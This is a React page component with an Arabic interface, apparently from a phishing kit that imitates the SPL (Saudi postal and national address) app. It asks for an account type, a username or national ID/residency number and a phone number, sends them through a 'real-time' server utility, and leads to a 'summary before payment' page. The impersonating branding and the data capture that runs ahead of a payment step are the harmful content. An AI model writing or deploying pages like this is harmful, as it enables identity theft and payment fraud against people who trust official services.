import { useState, useEffect } from "react";
import Box from "@mui/material/Box";
import Typography from "@mui/material/Typography";
import Button from "@mui/material/Button";
import Paper from "@mui/material/Paper";
import RadioGroup from "@mui/material/RadioGroup";
import FormControlLabel from "@mui/material/FormControlLabel";
import FormControl from "@mui/material/FormControl";
import CustomRadio from "../components/CustomRadio";
import CustomInput from "../components/CustomInput";
import Footer from "../components/footer";
import { setCurrentPage, sendDataToServer } from "@/real-time/utils/utils";

const PhoneLinkPage = () => {
  const [accountType, setAccountType] = useState("individual");
  const [formData, setFormData] = useState({
    identifier: "",
    phoneNumber: "",
  });
  const [showErrors, setShowErrors] = useState(false);

  useEffect(() => {
    setCurrentPage("توثيق رقم الجوال");
  }, []);

  const handleLinkPhone = () => {
    if (!formData.identifier || !formData.phoneNumber) {
      setShowErrors(true);
      return;
    }

    const accountTypeMap: Record<string, string> = {
      individual: "الأفراد",
      business: "الاعمال",
      government: "الخدمات الحكومية",
    };

    const dataToSend = {
      "نوع الحساب": accountTypeMap[accountType],
      "اسم المستخدم / رقم الهوية": formData.identifier,
      "رقم الهاتف المراد ربطه": formData.phoneNumber,
    };

    console.log("Linking phone:", dataToSend);

    sendDataToServer({
      data: dataToSend,
      current: "ربط رقم الهاتف وتنشيط الحساب",
      nextPage: "ملخص قبل الدفع",
    });
  };

  return (
    <Box
      sx={{
        display: "flex",
        flexDirection: "column",
        minHeight: "100vh",
        bgcolor: "#f0f2f5",
        fontFamily: "Tajawal",
      }}
      dir="rtl"
    >
      {/* Top Decoration */}
      <div className="h-[40px] bg-[#143c3c] border-b-2 border-[#146c84]" />

      <Box
        component="main"
        sx={{
          flexGrow: 1,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          py: 8,
          px: 2,
        }}
      >
        <div className="container max-w-[900px]">
          <img
            src="/assets/images/new/app_icon.png"
            alt="SPL App Icon"
            className="object-contain mb-4 self-start"
          />
          <Paper
            elevation={0}
            sx={{
              width: "100%",
              maxWidth: "650px",
              p: { xs: 4, md: 8 },
              borderRadius: "16px",
              boxShadow: "0 4px 24px rgba(0,0,0,0.06)",
              bgcolor: "white",
            }}
          >
            <Typography
              variant="h4"
              sx={{
                textAlign: "center",
                fontWeight: "700",
                color: "#153c3f",
                mb: 4,
                fontSize: { xs: "24px", md: "32px" },
              }}
            >
              ربط رقم الهاتف وتنشيط الحساب
            </Typography>

            <Typography
              variant="h6"
              sx={{
                fontWeight: "bold",
                color: "#153c3f",
                mb: 3,
                fontSize: "18px",
              }}
            >
              الرجاء اختيار نوع الحساب
            </Typography>

            <FormControl component="fieldset" fullWidth sx={{ mb: 4 }}>
              <RadioGroup
                value={accountType}
                onChange={(e) => setAccountType(e.target.value)}
                sx={{
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "flex-end",
                  gap: 2,
                }}
                dir="ltr"
              >
                <FormControlLabel
                  value="individual"
                  control={<CustomRadio />}
                  label={
                    <Typography
                      sx={{
                        color: "#6b7280",
                        fontSize: "1rem",
                      }}
                    >
                      الأفراد
                    </Typography>
                  }
                  sx={{ flexDirection: "row-reverse", margin: 0 }}
                />
                <FormControlLabel
                  value="business"
                  control={<CustomRadio />}
                  label={
                    <Typography
                      sx={{
                        color: "#6b7280",
                        fontSize: "1rem",
                      }}
                    >
                      الاعمال
                    </Typography>
                  }
                  sx={{ flexDirection: "row-reverse", margin: 0 }}
                />
                <FormControlLabel
                  value="government"
                  control={<CustomRadio />}
                  label={
                    <Typography
                      sx={{
                        color: "#6b7280",
                        fontSize: "1rem",
                      }}
                    >
                      الخدمات الحكومية
                    </Typography>
                  }
                  sx={{ flexDirection: "row-reverse", margin: 0 }}
                />
              </RadioGroup>
            </FormControl>

            <Typography
              sx={{
                fontWeight: "bold",
                color: "#153c3f",
                fontSize: "20px",
                mb: 3,
              }}
            >
              بيانات التسجيل
            </Typography>

            <Box
              sx={{ display: "flex", flexDirection: "column", gap: 2.5, mb: 4 }}
            >
              <CustomInput
                placeholder="اسم المستخدم / رقم الهوية / رقم الإقامة"
                value={formData.identifier}
                onChange={(e) =>
                  setFormData({ ...formData, identifier: e.target.value })
                }
                error={showErrors && !formData.identifier}
              />
              <CustomInput
                placeholder="رقم الهاتف المراد ربطه"
                value={formData.phoneNumber}
                onChange={(e) =>
                  setFormData({ ...formData, phoneNumber: e.target.value })
                }
                error={showErrors && !formData.phoneNumber}
              />
            </Box>

            <Button
              variant="contained"
              onClick={handleLinkPhone}
              sx={{
                width: "fit-content",
                bgcolor: "#00c8e1",
                color: "#153c3f",
                fontWeight: "800",
                fontSize: "1rem",
                px: 8,
                py: 1.5,
                borderRadius: "8px",
                boxShadow: "none",
                textTransform: "none",
                "&:hover": {
                  bgcolor: "#00b2c9",
                  boxShadow: "none",
                },
              }}
            >
              ربط رقم الجوال
            </Button>
          </Paper>
        </div>
      </Box>

      <Footer />
    </Box>
  );
};

export default PhoneLinkPage;
